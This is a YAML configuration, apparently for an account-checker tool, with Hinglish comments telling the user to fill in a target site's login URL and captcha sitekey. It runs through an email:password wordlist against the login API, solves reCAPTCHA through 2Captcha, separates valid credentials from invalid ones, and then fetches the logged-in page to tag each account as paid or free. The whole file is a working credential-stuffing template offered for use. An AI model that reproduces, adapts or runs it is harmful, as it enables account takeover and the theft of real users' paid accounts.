# Generic JSON login + captcha + subscription check pattern
# Apni site ke DevTools values se URL/sitekey replace karo.

name: "Example JSON Login (Captcha + Follow-up)"
type: http
wordlist_format: "email:pass"

cloudflare:
  enabled: false

# 2Captcha — API key config mein ya CAPTCHA_API_KEY env variable
captcha:
  enabled: false
  provider: 2captcha
  api_key: ""
  type: recaptcha_v3
  sitekey: "YOUR_SITE_KEY_FROM_PAGE_SOURCE"
  page_url: "https://example.com/login"
  action: login
  min_score: 0.3

proxy: false
timeout: 60

request:
  method: POST
  url: "https://example.com/api/login"
  headers:
    Content-Type: "application/json"
    Accept: "application/json"
    Origin: "https://example.com"
    Referer: "https://example.com/login"
  body: |
    {
      "email": "{{email}}",
      "password": "{{password}}",
      "agreementCheckbox": true,
      "recaptchaToken": "{{recaptcha_token}}"
    }

success:
  - type: body_contains
    value: '"success":true'

fail:
  - type: body_contains
    value: '"reason":"credentialsInvalid"'
  - type: body_contains
    value: '"success":false'

capture:
  - type: json_path
    path: "redirectTo"
    save_as: "redirect"

# Login ke baad session cookies se page fetch — subscription check
follow_up:
  enabled: true
  method: GET
  url: "https://example.com/"
  headers:
    Accept: "text/html"
  subscription:
    type: body_contains
    value: "Upgrade Plan"
    save_as: "subscription"
    active_label: "active"
    none_label: "free"
